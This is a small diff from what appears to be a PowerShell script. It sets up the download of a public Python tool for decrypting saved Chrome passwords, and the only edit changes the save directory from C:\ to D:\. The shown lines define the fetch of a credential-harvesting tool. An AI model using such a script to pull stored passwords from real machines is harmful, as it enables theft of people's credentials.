@@ -2,7 +2,7 @@
 $scriptUrl = "https://raw.githubusercontent.com/ohyicong/decrypt-chrome-passwords/main/decrypt_chrome_password.py"
 
 # Define the directory where you want to download the script
-$scriptDir = "C:\"
+$scriptDir = "D:\"
 $scriptPath = Join-Path -Path $scriptDir -ChildPath "decrypt_chrome_password.py"
 
 # Define the output file path
